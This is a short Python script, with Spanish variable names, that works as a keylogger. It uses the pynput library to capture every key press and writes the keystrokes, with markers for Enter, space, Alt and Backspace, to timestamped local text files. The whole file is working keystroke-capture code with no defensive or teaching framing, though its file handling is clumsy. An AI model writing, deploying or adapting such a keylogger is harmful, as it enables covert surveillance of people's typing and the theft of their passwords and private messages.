import datetime
from pynput.keyboard import Listener
from io import open

Fecha_hoy = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

milista = []

def RecibirDatos(key):
	fichero = open(f"informacion_{Fecha_hoy}.txt", "w")
	key = str(key)
	cont_enter=0
	cont_space=0
	cont_alt=0
	cont_letra=0
	cont_back=0

	#Letras
	cont_a=0
	cont_n=0
	cont_d=0

	milista.append(key)

	for i in milista:
		if cont_letra==10:
			fichero.close()
			#fichero = open(f"informacion_{Fecha_hoy}.txt", "w")
			fecha=datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
			fichero = open(f"informacion_{fecha}.txt", "w")
			cont_letra=0
		

		if i == "Key.enter":
			fichero.write("\n")
			cont_enter=cont_enter+1
		elif i == "Key.space":
			fichero.write(" ")
			cont_space=cont_space+1
		elif i == "Key.alt_l":
			fichero.write("ALT")
			cont_alt=cont_alt+1
		elif i == "Key.backspace":
			fichero.write("%BORRAR%")
			cont_back=cont_back+1
		else:
			fichero.write(i.replace("'", ""))
			cont_letra=cont_letra+1 
	
	#fichero.write("\nCantidad de letras %d"%cont_letra)
	



with Listener(on_press=RecibirDatos) as l:
	l.join()


